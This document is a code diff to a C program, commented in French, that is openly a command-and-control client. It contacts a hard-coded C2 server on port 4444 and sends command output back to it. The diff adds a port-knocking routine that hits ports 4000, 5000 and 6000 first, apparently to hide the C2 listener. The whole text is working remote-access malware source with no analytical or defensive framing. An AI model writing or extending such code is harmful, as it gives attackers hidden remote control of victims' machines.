@@ -4,11 +4,33 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
+
 #define SERVER_IP "192.168.111.208"  // Change avec l'IP de ton serveur C2
+#define KNOCK_PORTS {4000, 5000, 6000}
 #define PORT 4444
 #define BUFFER_SIZE 1024
 
+
+    void knock_port(int port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
+    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+    close(sock);
+    sleep(1);
+}
+
 int main() {
+
+    int ports[] = KNOCK_PORTS;
+    for (int i = 0; i < sizeof(ports) / sizeof(ports[0]); i++)
+        knock_port(ports[i]);
+
+    printf("[+] Connexion au C2 sur %d...\n", PORT);
+    
+    
     int sock;
     struct sockaddr_in server_addr;
     char buffer[BUFFER_SIZE];
@@ -62,6 +84,10 @@ int main() {
 
         send(sock, output, strlen(output), 0);
     }
+
+   
+
+
 
     close(sock);
     return 0;
